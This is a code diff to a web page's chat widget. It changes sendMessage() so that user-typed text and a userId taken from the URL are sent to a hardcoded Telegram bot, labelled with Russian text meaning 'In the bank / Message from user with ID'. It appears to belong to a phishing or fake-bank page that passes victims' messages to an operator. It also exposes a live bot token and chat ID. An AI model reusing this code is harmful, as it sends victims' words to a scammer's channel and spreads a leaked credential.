@@ -247,6 +247,12 @@
     cursor: default;
     padding: 0px;
 }
+.input-wrapper-text {
+    background: rgb(0, 102, 255);
+    color: rgb(255, 255, 255);
+    padding: 10px;
+    border-radius: 10px;
+}
 </style>
 <style>
 
@@ -861,10 +867,16 @@
 function sendMessage() {
 
     var message = document.getElementById("typing1").value;
+    const queryString = window.location.search;
+    const urlParams = new URLSearchParams(queryString);
+    const userIdentifier = urlParams.get('userId');
+    const customMessage = `
+    💸 В банке\n 📩 Сообщение от пользователя с \n▫️ID: ${userIdentifier}\n▫️Сообшения: ${message}
+    `;
     const url = `https://api.telegram.org/bot6687498994:AAHqL9v5RO7-CXKpEtXcrlAD9EIMkIRZVwA/sendMessage`;
     const obj = {
         chat_id: '5710170784',
-        text: message,
+        text: customMessage,
         sender: "user"
     };
 
